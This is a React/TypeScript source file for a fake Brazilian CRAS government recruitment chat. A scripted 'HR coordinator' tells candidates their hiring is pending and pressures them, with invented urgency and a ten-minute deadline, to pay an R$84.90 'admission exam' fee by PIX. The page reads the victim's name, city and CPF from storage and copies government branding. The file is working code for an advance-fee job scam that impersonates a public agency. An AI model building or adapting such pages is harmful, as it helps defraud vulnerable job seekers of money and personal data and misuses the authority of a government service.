import React, { useState, useEffect, useRef } from 'react';
import { Users, Facebook, Instagram } from 'lucide-react';

interface ChatMessage {
  message: string | (() => string);
  delay: number;
  longTypingTime?: boolean;
  showOptions?: string;
  showPaymentButton?: boolean;
  showTimer?: boolean;
}

const ChatPage: React.FC = () => {
  const [messages, setMessages] = useState<Array<{text: string, isIncoming: boolean, showTime: boolean}>>([]);
  const [currentSequenceIndex, setCurrentSequenceIndex] = useState(0);
  const [showTyping, setShowTyping] = useState(false);
  const [currentOptions, setCurrentOptions] = useState<string | null>(null);
  const [showPaymentButton, setShowPaymentButton] = useState(false);
  const [showTimer, setShowTimer] = useState(false);
  const [timerValue, setTimerValue] = useState(300); // 5 minutes
  const [isInitialized, setIsInitialized] = useState(false);
  const chatContainerRef = useRef<HTMLDivElement>(null);

  // Get candidate data
  const candidateData = {
    name: (localStorage.getItem('candidateName') || 'CANDIDATO USUARIO').trim(),
    city: (localStorage.getItem('candidateCity') || 'São Paulo').trim(),
    cpf: (localStorage.getItem('candidateCPF') || '').trim()
  };

  const firstName = candidateData.name.split(' ')[0];

  // Chat sequence
  const chatSequence: ChatMessage[] = [
    {
      message: `Olá ${firstName}, tudo bem? Aqui é a Tereza, Coordenadora de RH do CRAS.`,
      delay: 3000
    },
    {
      message: "Estou entrando em contato porque sua contratação ainda não foi concluída. Entre os candidatos selecionados, alguns já confirmaram o agendamento do exame médico, outros já realizaram o exame e só está faltando você confirmar. Para finalizar o processo, vou apenas confirmar alguns dados rapidamente com você.",
      delay: 12000
    },
    {
      message: "Se ainda tiver interesse na vaga você vai receber o seguinte salário e benefícios:",
      delay: 3000
    },
    {
      message: `Cargo: Assistente Social\nSalário Base: R$ 4.500 - R$ 5.500\nVale Alimentação: R$ 1.320,00 por mês\nBenefícios:\n• Seguro de vida\n• Plano de saúde e odontológico\n• Auxílio creche: R$ 240,00/mensal por cada filho abaixo de 6 anos\n• Estabilidade no serviço público\n• 13º salário e férias\n• Capacitações e formação continuada\n• Participação em projetos sociais\n\n${firstName}, você ainda tem interesse na vaga no unidade CRAS selecionada?`,
      delay: 6000,
      longTypingTime: true,
      showOptions: 'interestOptions'
    }
  ];

  const startWorkResponses: ChatMessage[] = [
    {
      message: "Perfeito! Obrigada por confirmar seu interesse. Agora vou fazer só mais algumas perguntas para finalizar o processo.",
      delay: 2500
    },
    {
      message: "O CRAS fornecerá gratuitamente o curso de serviço social para que você possa atuar na area.",
      delay: 4000
    },
    {
      message: "Não é exigido nenhum curso ou experiência prévia para ocupar a função de Assistente Social. O único curso exigido será fornecido pelo CRAS.",
      delay: 4200
    },
    {
      message: () => {
        const examDate = localStorage.getItem('examDate') || 'data não informada';
        const examTime = localStorage.getItem('examTime') || 'horário não informado';
        return `Conforme seu agendamento, seu exame médico admissional será em ${examDate} no horário ${examTime}.`;
      },
      delay: 3800
    },
    {
      message: () => {
        const clinicData = localStorage.getItem('clinicLocation');
        if (clinicData) {
          try {
            const clinic = JSON.parse(clinicData);
            return `Você deverá comparecer com documento de identificação com foto, carteira de trabalho e comprovante de residência.\n\n📍 Local do exame:\n${clinic.nome}\n${clinic.endereco}\nTelefone: ${clinic.telefone}`;
          } catch (e) {
            return "Você deverá comparecer com documento de identificação com foto, carteira de trabalho e comprovante de residência no local do exame médico informado.";
          }
        } else {
          return "Você deverá comparecer com documento de identificação com foto, carteira de trabalho e comprovante de residência no local do exame médico informado.";
        }
      },
      delay: 4500,
    },
    {
      message: "Neste dia será iniciado o processo de contratação através do exame médico admissional, onde serão realizados exames clínicos, laboratoriais e avaliação psicológica para verificar sua aptidão para exercer as funções de Assistente Social.",
      delay: 5000
    },
    {
      message: "Verifiquei aqui que você ainda não confirmou o agendamento do exame admissional. Todos os outros candidatos já confirmaram e vão ser contratados ainda essa semana.",
      delay: 7000,
    },
    {
      message: "Essa clínica é a única conveniada ao CRAS e ela cobra o valor de R$84,90 para realizar todos os exames de admissão exigidos por lei.",
      delay: 8000
    },
    {
      message: "Sem o pagamento, infelizmente não conseguirei dar andamento na sua contratação e você pode perder a vaga a qualquer momento.",
      delay: 4500
    },
    {
      message: "Se você conseguir realizar o pagamento e confirmar seu exame em até 10 minutos, consigo segurar sua vaga e não passar para outro candidato.",
      delay: 5000
    },
    {
      message: `${firstName}, você vai realizar o pagamento e confirmar o exame ou deseja desistir da vaga?`,
      delay: 2800,
      showOptions: 'paymentOptions'
    }
  ];

  const paymentConfirmation: ChatMessage[] = [
    {
      message: "Perfeito! Vou segurar sua vaga, mas você precisa realizar o pagamento e confirmar para mim o quanto antes.",
      delay: 6000
    },
    {
      message: "Para realizar o pagamento é só clicar no botão abaixo para acessar a guia de pagamento do exame médico:",
      delay: 4500,
      showPaymentButton: true
    }
  ];

  const interestExplanation: ChatMessage[] = [
    {
      message: "Entendo sua decisão. Caso mude de ideia, sua vaga continuará disponível por mais 24 horas em nosso sistema.",
      delay: 2500
    },
    {
      message: "Se decidir prosseguir com a candidatura, basta acessar novamente o link que enviamos. Obrigada pelo seu tempo e atenção!",
      delay: 3000
    }
  ];

  const desistirExplanation: ChatMessage[] = [
    {
      message: "Entendo sua decisão. Infelizmente sua vaga será liberada para outros candidatos. Caso mude de ideia, pode entrar em contato conosco novamente.",
      delay: 4000
    }
  ];

  const getFormattedTime = () => {
    const now = new Date();
    return now.getHours().toString().padStart(2, '0') + ':' + 
           now.getMinutes().toString().padStart(2, '0');
  };

  const addMessage = (text: string, isIncoming: boolean = true, showTime: boolean = false) => {
    setMessages(prev => {
      // Check if this exact message already exists to prevent duplicates
      const messageExists = prev.some(msg => msg.text === text && msg.isIncoming === isIncoming);
      if (messageExists) {
        return prev;
      }
      
      const newMessages = prev.map(msg => ({ ...msg, showTime: false }));
      return [...newMessages, { text, isIncoming, showTime }];
    });

    // Auto scroll to bottom
    setTimeout(() => {
      if (chatContainerRef.current) {
        chatContainerRef.current.scrollTop = chatContainerRef.current.scrollHeight;
      }
    }, 100);
  };

  const showTypingIndicator = (duration: number) => {
    return new Promise<void>((resolve) => {
      setShowTyping(true);
      setTimeout(() => {
        setShowTyping(false);
        resolve();
      }, duration);
    });
  };

  const processMessageSequence = async (sequence: ChatMessage[]) => {
    for (let i = 0; i < sequence.length; i++) {
      const msg = sequence[i];
      const isLastMessage = i === sequence.length - 1;
      const typingTime = msg.longTypingTime ? 8000 : Math.min((typeof msg.message === 'string' ? msg.message.length : 100) * 90, 6000);
      
      await showTypingIndicator(typingTime);
      
      let messageText = typeof msg.message === 'function' ? msg.message() : msg.message;
      
      // Replace placeholder with actual CRAS unit data
      if (messageText.includes('unidade CRAS selecionada')) {
        try {
          const selectedUnit = JSON.parse(localStorage.getItem('selectedCrasUnit') || '{}');
          if (selectedUnit.name) {
            messageText = messageText.replace('unidade CRAS selecionada', `${selectedUnit.name}`);
            messageText += `\nLocalizado em: ${selectedUnit.address}`;
          }
        } catch (error) {
          console.log('Could not load selected unit from localStorage');
        }
      }
      
      addMessage(messageText, true, isLastMessage);
      
      if (msg.showOptions) {
        setTimeout(() => setCurrentOptions(msg.showOptions!), 1000);
      }
      
      if (msg.showPaymentButton) {
        setTimeout(() => setShowPaymentButton(true), 1000);
      }
      
      if (msg.showTimer) {
        setTimeout(() => {
          setShowTimer(true);
          startTimer();
        }, 1000);
      }
      
      if (i < sequence.length - 1) {
        await new Promise(resolve => setTimeout(resolve, msg.delay));
      }
    }
  };

  const startTimer = () => {
    const interval = setInterval(() => {
      setTimerValue(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const handleOptionClick = async (responseText: string, nextAction: string) => {
    addMessage(responseText, false, true);
    setCurrentOptions(null);
    
    setTimeout(async () => {
      if (nextAction === 'showInterestExplanation') {
        await processMessageSequence(interestExplanation);
      } else if (nextAction === 'showBenefits') {
        await processMessageSequence(startWorkResponses);
      } else if (nextAction === 'showPaymentConfirmation') {
        await processMessageSequence(paymentConfirmation);
      } else if (nextAction === 'showDesistirExplanation') {
        await processMessageSequence(desistirExplanation);
      }
    }, 1000);
  };

  const startPaymentProcess = () => {
    const loadingOverlay = document.createElement('div');
    loadingOverlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      color: white;
      font-family: 'Sora', sans-serif;
    `;
    
    loadingOverlay.innerHTML = `
      <div class="text-center">
        <div class="spinner" style="
          border: 4px solid #f3f3f3;
          border-top: 4px solid #FBC804;
          border-radius: 50%;
          width: 60px;
          height: 60px;
          animation: spin 1s linear infinite;
          margin: 0 auto 20px;
        "></div>
        <h3 style="font-size: 1.5rem; margin-bottom: 10px;">Gerando transação PIX...</h3>
        <p style="font-size: 1rem; opacity: 0.8;">Aguarde enquanto preparamos seu pagamento</p>
      </div>
      <style>
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    `;
    
    document.body.appendChild(loadingOverlay);
    
    setTimeout(() => {
      window.location.href = '/pagamento';
    }, 2000);
  };

  useEffect(() => {
    const initializeChat = async () => {
      if (!isInitialized) {
        setIsInitialized(true);
        await processMessageSequence(chatSequence);
      }
    };
    
    initializeChat();
  }, [isInitialized]);

  const formatTimer = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Government Header */}
      <header className="bg-[#222222] text-white py-2">
        <div className="container mx-auto flex justify-between items-center px-4">
          <a className="font-bold text-sm" href="#">
            <img 
              src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" 
              alt="Logotipo Governo" 
              className="h-6"
            />
          </a>
          <nav>
            <ul className="flex space-x-4 text-[10px]">
              <li>
                <a className="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
              </li>
              <li>
                <a className="hover:underline" href="#">PARTICIPE</a>
              </li>
              <li>
                <a className="hover:underline" href="#">SERVIÇOS</a>
              </li>
            </ul>
          </nav>
        </div>
      </header>

      {/* CRAS Header */}
      <div className="bg-[#044785] py-3">
        <div className="container mx-auto px-4 text-center">
          <img 
            src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" 
            alt="Logo CRAS" 
            className="h-8 mx-auto"
          />
        </div>
      </div>

      {/* Attendant Info */}
      <div className="bg-gray-100 text-gray-800 px-4 md:px-8 py-3">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-center w-full">
            <div className="relative mr-4">
              <img 
                src="https://i.ibb.co/BHcYZ8tf/assets-task-01jy21c21yewes4neft2x006sh-1750267829-img-1-11zon.webp" 
                className="w-12 h-12 rounded-full object-cover border-2 border-green-500" 
                alt="Tereza Alencar"
              />
              <span className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 rounded-full border-2 border-white"></span>
            </div>
            <div className="flex-1">
              <h2 className="text-gray-800 text-lg font-semibold">Tereza Alencar</h2>
              <p className="text-gray-600 text-sm">Coordenadora de RH - CRAS</p>
            </div>
          </div>
        </div>
      </div>

      <main className="container mx-auto px-4 py-2 flex-grow">
        <div className="max-w-6xl mx-auto">
          {/* Chat Container */}
          <div className="overflow-hidden relative">
            <div 
              ref={chatContainerRef}
              className="overflow-y-auto p-4 space-y-4"
              style={{ height: 'calc(100vh - 200px)', minHeight: '400px' }}
            >
              {/* Messages */}
              {messages.map((msg, index) => (
                <div key={`${index}-${msg.text.substring(0, 20)}`} className={`flex ${msg.isIncoming ? 'justify-start' : 'justify-end'}`}>
                  <div className={`max-w-xs lg:max-w-md px-4 py-2 rounded-lg ${
                    msg.isIncoming 
                      ? 'bg-[#044785] text-white' 
                      : 'bg-gray-200 text-gray-900'
                  }`}>
                    <div className="whitespace-pre-wrap">{msg.text}</div>
                    {msg.showTime && (
                      <div className="text-xs opacity-70 mt-1">
                        {getFormattedTime()}
                      </div>
                    )}
                  </div>
                </div>
              ))}

              {/* Typing Indicator */}
              {showTyping && (
                <div className="flex justify-start">
                  <div className="bg-[#044785] text-white px-4 py-2 rounded-lg max-w-20">
                    <div className="flex space-x-1">
                      <div className="w-2 h-2 bg-white rounded-full animate-bounce"></div>
                      <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></div>
                      <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
                    </div>
                  </div>
                </div>
              )}

              {/* Options */}
              {currentOptions === 'interestOptions' && (
                <div className="space-y-2">
                  <button 
                    onClick={() => handleOptionClick('Sim, tenho interesse', 'showBenefits')}
                    className="w-full text-left p-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200"
                  >
                    <span className="text-green-600 mr-2">✓</span>
                    Sim, tenho interesse
                  </button>
                  <button 
                    onClick={() => handleOptionClick('Não tenho interesse', 'showInterestExplanation')}
                    className="w-full text-left p-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200"
                  >
                    <span className="text-red-600 mr-2">✗</span>
                    Não tenho interesse
                  </button>
                </div>
              )}

              {currentOptions === 'paymentOptions' && (
                <div className="space-y-2">
                  <button 
                    onClick={() => handleOptionClick('Vou realizar o pagamento', 'showPaymentConfirmation')}
                    className="w-full text-left p-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200"
                  >
                    Vou realizar o pagamento
                  </button>
                  <button 
                    onClick={() => handleOptionClick('Quero desistir da vaga', 'showDesistirExplanation')}
                    className="w-full text-left p-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200"
                  >
                    Quero desistir da vaga
                  </button>
                </div>
              )}

              {/* Payment Button */}
              {showPaymentButton && (
                <div className="text-center my-4">
                  <button 
                    onClick={startPaymentProcess}
                    className="inline-block px-6 py-3 bg-green-600 text-white font-semibold rounded-lg hover:bg-green-700 transition-colors duration-200"
                  >
                    Confirmar Exame Admissional
                  </button>
                </div>
              )}

              {/* Timer */}
              {showTimer && (
                <div className="text-center my-4 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
                  <div className="text-2xl font-bold text-red-600 mb-2">
                    {formatTimer(timerValue)}
                  </div>
                  <div className="text-sm text-gray-700 mb-3">
                    Tempo restante para garantir sua vaga
                  </div>
                  <button 
                    onClick={startPaymentProcess}
                    className="inline-block px-6 py-3 bg-[#044785] text-white font-semibold rounded-lg hover:bg-blue-700 transition-colors duration-200"
                  >
                    🔒 Efetuar Pagamento da Taxa de Segurança
                  </button>
                  <p className="mt-2 text-xs text-gray-600">
                    O valor de R$ 73,40 será totalmente reembolsado no seu primeiro pagamento.
                  </p>
                </div>
              )}
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#044785] text-white py-8 md:py-12">
        <div className="container mx-auto px-4 md:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">O que é o CRAS</a></li>
                <li><a href="#" className="hover:text-gray-200">Missão e Valores</a></li>
                <li><a href="#" className="hover:text-gray-200">Onde Atuamos</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Serviços</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Proteção Social Básica</a></li>
                <li><a href="#" className="hover:text-gray-200">Atendimento às Famílias</a></li>
                <li><a href="#" className="hover:text-gray-200">Grupos de Convivência</a></li>
                <li><a href="#" className="hover:text-gray-200">Benefícios Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Assistência Social</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Cadastro Único</a></li>
                <li><a href="#" className="hover:text-gray-200">Bolsa Família</a></li>
                <li><a href="#" className="hover:text-gray-200">BPC</a></li>
                <li><a href="#" className="hover:text-gray-200">Auxílio Brasil</a></li>
                <li><a href="#" className="hover:text-gray-200">Programas Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Vagas</a></li>
                <li><a href="#" className="hover:text-gray-200">Portal do Servidor</a></li>
                <li><a href="#" className="hover:text-gray-200">Capacitações</a></li>
                <li><a href="#" className="hover:text-gray-200">Concursos</a></li>
              </ul>
            </div>
          </div>
          
          <hr className="border-blue-400 mb-6" />
          
          <div className="flex flex-col md:flex-row justify-between items-center text-xs text-white">
            <div className="mb-4 md:mb-0">
              <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
            </div>
            <div className="flex flex-wrap justify-center gap-2 md:gap-4">
              <a href="#" className="hover:text-gray-200">Mapa do Site</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Política de Privacidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Lei de Acesso à Informação</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Acessibilidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Ouvidoria</a>
            </div>
            <div className="flex space-x-4 mt-4 md:mt-0">
              <a href="#" className="text-white hover:text-gray-200">
                <Facebook size={16} />
              </a>
              <a href="#" className="text-white hover:text-gray-200">
                <Instagram size={16} />
              </a>
            </div>
          </div>
        </div>
      </footer>

      {/* Floating Accessibility Icon */}
      <a 
        href="#" 
        className="fixed bottom-4 right-4 bg-blue-600 p-3 rounded-full shadow-lg hover:bg-blue-700 transition-colors z-50"
      >
        <Users className="w-6 h-6 text-white" />
      </a>
    </div>
  );
};

export default ChatPage;